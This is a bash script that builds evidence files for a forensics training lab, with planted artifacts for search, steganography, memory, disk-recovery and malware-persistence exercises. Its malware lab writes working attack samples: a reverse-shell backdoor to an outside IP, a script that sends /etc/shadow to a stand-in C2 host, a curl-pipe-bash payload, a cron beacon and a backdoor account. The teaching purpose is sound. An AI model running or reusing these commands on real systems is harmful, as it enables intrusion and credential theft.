#!/bin/bash
# Creates all evidence directories and files for the Digital Forensics labs.
# Runs as root during Docker image build.
set -e

LABS="/home/student/labs"
mkdir -p "$LABS"

# ─────────────────────────────────────────────────────────────────────────────
# LAB 3 — Evidence Search and Metadata Analysis
# Commands: ls -R, find -name/-iname/-type/-size/-mtime/-perm, stat, grep -Ri, strings
# ─────────────────────────────────────────────────────────────────────────────
LAB3="$LABS/evidence-search"
mkdir -p "$LAB3/reports" "$LAB3/logs" "$LAB3/documents"

# Normal text files
cat > "$LAB3/reports/q1_report.txt" <<'EOF'
Q1 Financial Summary
Revenue: $120,000
Expenses: $80,000
Net Profit: $40,000
EOF

cat > "$LAB3/reports/q2_report.txt" <<'EOF'
Q2 Financial Summary
Revenue: $135,000
Expenses: $91,000
Net Profit: $44,000
EOF

cat > "$LAB3/documents/meeting_notes.TXT" <<'EOF'
Meeting Notes - Board Meeting
Attendees: CEO, CFO, Legal
Topic: Q3 projections and compliance review
password for vault: see encrypted backup
EOF

cat > "$LAB3/logs/access.log" <<'EOF'
2024-01-15 09:00:01 user=admin LOGIN SUCCESS
2024-01-15 09:15:33 user=jsmith LOGIN SUCCESS
2024-01-15 10:42:17 user=unknown LOGIN FAILED
2024-01-15 11:00:00 user=admin FILE_ACCESS sensitive_report.pdf
EOF

cat > "$LAB3/suspicious.txt" <<'EOF'
This file has suspicious permissions.
It should not be world-writable.
password=admin123
EOF
chmod 777 "$LAB3/suspicious.txt"

# File larger than 10MB
dd if=/dev/urandom of="$LAB3/large_file.bin" bs=1M count=12 2>/dev/null

# File modified very recently (within last day — mtime -1)
touch "$LAB3/recent_activity.log"
echo "Recent login from 192.168.1.200 at $(date)" > "$LAB3/recent_activity.log"

# Older file (modified 10 days ago)
touch -d "10 days ago" "$LAB3/old_archive.tar"

# ─────────────────────────────────────────────────────────────────────────────
# LAB 4 — Hidden Data and Anti-Forensics
# Commands: ls -la, file *, unzip -l budget.docx, stat *, grep -iE,
#           strings logo.jpg, steghide info logo.jpg, steghide extract -sf logo.jpg,
#           cat Sensitive_Data.txt
# ─────────────────────────────────────────────────────────────────────────────
LAB4="$LABS/hidden-data"
mkdir -p "$LAB4"

# Hidden file (starts with .)
cat > "$LAB4/.hidden_config.txt" <<'EOF'
[config]
server=192.168.10.5
port=4444
user=backdoor
pass=s3cr3t_p@ss
EOF

# Sensitive data file
cat > "$LAB4/Sensitive_Data.txt" <<'EOF'
CONFIDENTIAL — Internal Use Only
Client: ACME Corporation
Project: Comet
Budget: $2,400,000
Key Contact: john.doe@acmecorp.com
Password for archive: forensics2024
EOF

# budget.docx is actually a ZIP file (anti-forensics fake extension)
mkdir -p /tmp/zip_src_lab4
cat > /tmp/zip_src_lab4/salary_data.csv <<'EOF'
Name,Role,Salary
John Smith,Director,120000
Jane Doe,Manager,85000
Bob Lee,Engineer,70000
EOF
cat > /tmp/zip_src_lab4/confidential_deals.txt <<'EOF'
Deal #001: Client XYZ - $500,000 contract signed 2024-01-10
Deal #002: Client ABC - $250,000 pending approval
EOF
cd /tmp/zip_src_lab4 && zip -q /tmp/budget_zip.zip salary_data.csv confidential_deals.txt
cp /tmp/budget_zip.zip "$LAB4/budget.docx"

# logo.jpg — real JPEG with steghide hidden message (empty passphrase)
cat > /tmp/steg_secret_lab4.txt <<'EOF'
HIDDEN EVIDENCE:
Suspect transferred 50,000 USD to offshore account BK-20240115.
Contact: shadow_broker@darkmail.onion
EOF

convert -size 200x200 plasma: /tmp/logo_base.jpg 2>/dev/null || \
    convert -size 200x200 xc:blue /tmp/logo_base.jpg
steghide embed -cf /tmp/logo_base.jpg -ef /tmp/steg_secret_lab4.txt -p "" -f -q
cp /tmp/logo_base.jpg "$LAB4/logo.jpg"

# A file that looks normal but actually has base64-encoded content
echo "UkVBRE1FIC0gdGhpcyBmaWxlIGlzIG5vdCB3aGF0IGl0IHNlZW1z" > "$LAB4/readme.pdf"

# Timestamp manipulation: modify a file's timestamp to look old
touch -d "2020-03-15 08:00:00" "$LAB4/Sensitive_Data.txt"

# ─────────────────────────────────────────────────────────────────────────────
# LAB 5 — Linux Regex and Artifact Extraction
# Commands: grep -Eo (email/IP/URL/phone/MAC), wc -l
# ─────────────────────────────────────────────────────────────────────────────
LAB5="$LABS/regex"
mkdir -p "$LAB5"

cat > "$LAB5/evidence.txt" <<'EOF'
=== Network Forensics Evidence Log ===
Date: 2024-01-15

[CONTACTS]
Primary suspect email: john.smith@acmecorp.com
Secondary contact: jane.doe@gmail.com
Anonymous tip from: whistleblower_99@protonmail.com
IT administrator: admin@internal.corp.eg

[NETWORK CONNECTIONS]
Suspicious outbound connection from 192.168.1.105 to 45.33.32.156
Internal DNS server: 10.0.0.1
Gateway: 172.16.0.1
Malware C2 server: 203.0.113.45
Attacker origin: 185.220.101.33

[URLS DETECTED]
Data exfiltration attempt to: https://evil-c2.darkweb.io/upload
Malware downloaded from: http://malware-host.ru/payload.exe
Legitimate update check: https://updates.microsoft.com/check
Phishing URL: https://paypa1-secure.com/login

[PHONE NUMBERS - EGYPT]
Suspect mobile: 01012345678
Accomplice number: 01198765432
Burner phone used: 01523456789
HR contact: 01267890123

[NETWORK HARDWARE]
Suspect laptop MAC: AA:BB:CC:DD:EE:FF
Router MAC address: 00:11:22:33:44:55
USB WiFi adapter: DE:AD:BE:EF:CA:FE

[ADDITIONAL NOTES]
The suspect used VPN service at vpn.suspect-provider.net
Password reuse detected — same password across: john.smith@acmecorp.com and john.smith@gmail.com
EOF

# ─────────────────────────────────────────────────────────────────────────────
# LAB 6 — Memory Forensics Basics
# Commands: volatility -f memory.raw imageinfo/pslist/pstree/netscan/cmdscan/procdump,
#           strings memory.raw | grep -i password
# ─────────────────────────────────────────────────────────────────────────────
LAB6="$LABS/memory"
mkdir -p "$LAB6/output"

# Fake memory dump: not a valid Windows image (commands show syntax, not real results).
# It DOES contain readable strings for the 'strings | grep password' task.
{
    printf "FAKEDUMP-CYBERARCADE-FORENSICS-LAB\x00"
    # Readable strings that grep will find
    echo "PROCESS: svchost.exe PID:1234 PPID:564"
    echo "PROCESS: powershell.exe PID:2048 PPID:1234"
    echo "PROCESS: cmd.exe PID:3012 PPID:2048"
    echo "NETWORK: 192.168.1.105:49234 -> 45.33.32.156:443 ESTABLISHED"
    echo "NETWORK: 192.168.1.105:49300 -> 203.0.113.45:80 CLOSE_WAIT"
    echo "CMD: powershell -EncodedCommand JABXAGMAIAA9ACAATgBlAHcA..."
    echo "CMD: cmd.exe /c net user backdoor P@ssw0rd /add"
    echo "REG: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -> C:\Users\student\AppData\malware.exe"
    echo "STR: password=admin123 cached_credentials=yes"
    echo "STR: net_password=P@ssw0rd domain=CORP"
    echo "STR: password_hash=5f4dcc3b5aa765d61d8327deb882cf99"
    # Pad with random data to make it look like a real dump
    dd if=/dev/urandom bs=1M count=5 2>/dev/null
} > "$LAB6/memory.raw"

# ─────────────────────────────────────────────────────────────────────────────
# LAB 7 — Deleted File Recovery with Sleuth Kit
# Commands: mmls evidence.dd, fls -r/-rd evidence.dd,
#           istat evidence.dd <inode>, icat evidence.dd <inode> > recovered.txt,
#           strings recovered.txt, file recovered.txt
# NOTE: tasks 4 & 5 say "inode 12" — build structure guarantees this.
# ─────────────────────────────────────────────────────────────────────────────
LAB7="$LABS/diskimage"
mkdir -p "$LAB7"

# Build ext2 image source directory.
# genext2fs allocates inodes starting at 11 for the first entry it finds.
# We add a lost+found directory as the FIRST entry (alphabetically 'l' > nothing)
# but to guarantee ordering we name dummy files so they sort before evidence.
# Root=2, reserved 3-10, lost+found=11, evidence.txt=12.
mkdir -p /tmp/disk_src
mkdir -p /tmp/disk_src/lost+found   # ensures inode 11

cat > /tmp/disk_src/evidence.txt <<'EOF'
CONFIDENTIAL EVIDENCE — CASE #2024-1547
Investigator: Det. Sarah Chen
Date Collected: 2024-01-15

FINDINGS:
- Suspect accessed unauthorized financial database on 2024-01-14 at 23:47
- Transferred $127,500 to offshore account: CH-9300762011623852957
- Used compromised credentials: admin_backup / P@ssw0rd123
- Evidence of data exfiltration to: https://evil-server.io/upload
- Device serial: USB-20240114-XK91

This file was deleted in an attempt to destroy evidence.
EOF

# Create ext2 image (12MB) from /tmp/disk_src
genext2fs -b 12288 -d /tmp/disk_src "$LAB7/evidence.dd"

# Delete evidence.txt from the image using debugfs (no root/loop mount needed)
printf 'rm /evidence.txt\n' | debugfs -w "$LAB7/evidence.dd" 2>/dev/null || true

# Verify the delete worked — should show "(deleted)" in fls output
# fls "$LAB7/evidence.dd" | grep -i deleted || echo "[WARN] no deleted files found"

# Clean up temp
rm -rf /tmp/disk_src

# ─────────────────────────────────────────────────────────────────────────────
# LAB 6 — Steganography and Metadata Analysis
# Commands: steghide info/extract company_logo.bmp -p forensics,
#           exiftool company_logo.jpg, exiftool -FileType financial_report.docx
# ─────────────────────────────────────────────────────────────────────────────
LAB8="$LABS/insider"
mkdir -p "$LAB8"

# financial_report.docx — actually a ZIP archive (exiftool -FileType → ZIP)
mkdir -p /tmp/zip_src_lab8
cat > /tmp/zip_src_lab8/salary_list.xlsx <<'EOF'
employee_id,name,salary,bonus
E001,John Smith,120000,15000
E002,Jane Doe,95000,12000
E003,Ahmed Hassan,75000,8000
EOF
cat > /tmp/zip_src_lab8/invoice_2024.pdf <<'EOF'
INVOICE #2024-001
Vendor: Shadow Services LLC
Amount: $45,000
Description: "Consulting fees" (FRAUDULENT — internal memo)
EOF
cat > /tmp/zip_src_lab8/confidential_strategy.txt <<'EOF'
CONFIDENTIAL — Board Only
Q4 Strategy: Acquisition of CompetitorX for $2.1M
Key contacts: ceo@competitorx.com
This document must not leave the organization.
EOF
cd /tmp/zip_src_lab8 && zip -q /tmp/insider_zip.zip salary_list.xlsx invoice_2024.pdf confidential_strategy.txt
cp /tmp/insider_zip.zip "$LAB8/financial_report.docx"

# hidden_evidence.txt — content embedded into company_logo.bmp via steghide
# The filename embedded matters: steghide info shows it as "hidden_evidence.txt"
cat > /tmp/hidden_evidence.txt <<'EOF'
HIDDEN DATA EXTRACTED:
Employee copied 47 confidential files to USB on 2024-01-12.
Files included: salary_list.xlsx, confidential_strategy.txt, client_db.csv
Destination USB serial: USB-202401-INSIDER
Contact email used: personal_email@gmail.com
EOF

# company_logo.bmp — BMP (natively supported by steghide), passphrase: forensics
# Use Python to create a valid 24-bit BMP so we don't depend on ImageMagick's policy.xml
python3 - <<'PYEOF'
import struct, sys
width, height = 150, 150
row_bytes = width * 3
pad = (4 - row_bytes % 4) % 4  # each row padded to 4-byte boundary
pixel_data_size = (row_bytes + pad) * height
file_size = 54 + pixel_data_size
header = struct.pack('<2sIHHI', b'BM', file_size, 0, 0, 54)
info   = struct.pack('<IiiHHIIiiII', 40, width, height, 1, 24, 0,
                     pixel_data_size, 2835, 2835, 0, 0)
rows = bytearray()
for y in range(height):
    for x in range(width):
        g = int(255 * x / (width - 1))
        b = int(255 * y / (height - 1))
        rows += bytes([b, g, 0])  # BGR
    rows += b'\x00' * pad
with open('/tmp/company_logo_base.bmp', 'wb') as f:
    f.write(header + info + rows)
print("BMP created OK")
PYEOF
steghide embed -cf /tmp/company_logo_base.bmp -ef /tmp/hidden_evidence.txt -p "forensics" -f -q && \
cp /tmp/company_logo_base.bmp "$LAB8/company_logo.bmp" || \
echo "[warn] company_logo.bmp steghide embed failed — lab partially functional"

# company_logo.jpg — plain JPEG for the exiftool Task 3 demonstration
(convert -size 150x150 gradient:blue-green /tmp/company_logo_jpeg.jpg 2>/dev/null || \
    convert -size 150x150 xc:blue /tmp/company_logo_jpeg.jpg 2>/dev/null) && \
cp /tmp/company_logo_jpeg.jpg "$LAB8/company_logo.jpg" || \
echo "[warn] company_logo.jpg creation failed"

# ─────────────────────────────────────────────────────────────────────────────
# LAB 7 — Malware Persistence Analysis
# Commands: crontab -l, base64 -d encoded_payload.txt,
#           cat /etc/passwd | grep -v nologin, grep "Accepted" auth.log
# ─────────────────────────────────────────────────────────────────────────────
LAB9="$LABS/malware"
mkdir -p "$LAB9"

# encoded_payload.txt — base64 of "curl http://evil-c2.io/stage2.sh | bash"
printf 'curl http://evil-c2.io/stage2.sh | bash' | base64 > "$LAB9/encoded_payload.txt"

# auth.log — SSH login log with successful root login from attacker IP
cat > "$LAB9/auth.log" <<'EOF'
Jan 15 03:22:11 server sshd[1234]: Accepted password for root from 185.220.101.45 port 52413 ssh2
Jan 15 03:22:15 server sshd[1235]: Received disconnect from 185.220.101.45 port 52413:11: disconnected by user
Jan 15 09:15:00 server sshd[2100]: Failed password for invalid user testuser from 192.168.1.100 port 45678 ssh2
Jan 15 10:31:44 server sshd[2350]: Failed password for invalid user admin from 203.0.113.9 port 31200 ssh2
EOF

# backdoor.sh and collect_creds.sh — malicious scripts
cat > "$LAB9/backdoor.sh" <<'EOF'
#!/bin/bash
# Backdoor persistence script
ENCODED=$(echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xODUuMjIwLjEwMS40NS80NDQ0IDA+JjE=" | base64 -d)
eval "$ENCODED"
nohup bash -i >& /dev/tcp/185.220.101.45/4444 0>&1 &
EOF
chmod +x "$LAB9/backdoor.sh"

cat > "$LAB9/collect_creds.sh" <<'EOF'
#!/bin/bash
# Credential harvesting
base64 /etc/shadow > /tmp/.shadow_b64
curl -s -X POST https://evil-c2.io/collect -d "$(base64 /etc/shadow)"
cat ~/.bash_history | grep -i password | base64 -w0
EOF
chmod +x "$LAB9/collect_creds.sh"

# Malicious cron job for the student user: runs beacon every 5 minutes
# Write directly to the crontab spool file (no cron daemon needed during build)
mkdir -p /var/spool/cron/crontabs
printf '*/5 * * * * /tmp/.x/beacon.sh\n' > /var/spool/cron/crontabs/student
chmod 600 /var/spool/cron/crontabs/student
chown student /var/spool/cron/crontabs/student

# Backdoor system account with shell access (sysbackup)
useradd -m -s /bin/bash sysbackup 2>/dev/null || true

# ─────────────────────────────────────────────────────────────────────────────
# Ownership + motd
# ─────────────────────────────────────────────────────────────────────────────
chown -R student:student "$LABS"

cat > /etc/motd <<'EOF'

 ╔══════════════════════════════════════════════════════════╗
 ║          CyberArcade — Forensics Kali Terminal           ║
 ╠══════════════════════════════════════════════════════════╣
 ║  Evidence directories:                                   ║
 ║    ~/labs/evidence-search/   Lab 1 — Evidence Search     ║
 ║    ~/labs/hidden-data/       Lab 2 — Hidden Data         ║
 ║    ~/labs/regex/             Lab 3 — Regex Extraction    ║
 ║    ~/labs/memory/            Lab 4 — Memory Forensics    ║
 ║    ~/labs/diskimage/         Lab 5 — Deleted File        ║
 ║    ~/labs/insider/           Lab 6 — Steganography       ║
 ║    ~/labs/malware/           Lab 7 — Malware Persistence ║
 ╚══════════════════════════════════════════════════════════╝

EOF

# Configure student's shell to auto-start a named tmux session on SSH login.
# The backend autosolve injects commands via "tmux send-keys -t lab:0" so
# students can watch the commands run inside the visible Guacamole terminal.
cat >> /home/student/.bashrc <<'BASHEOF'

# CyberArcade: auto-attach to shared tmux session so autosolve runs visually
if [ -z "$TMUX" ] && [ -n "$SSH_CONNECTION" ]; then
    exec tmux new-session -A -s lab
fi
BASHEOF

# Enable tmux mouse mode so students can scroll with the mouse wheel
# inside Guacamole without needing Ctrl+B [
cat > /home/student/.tmux.conf <<'TMUXEOF'
set -g mouse on
TMUXEOF
chown student:student /home/student/.tmux.conf

echo "[setup_evidence.sh] Evidence files created successfully."
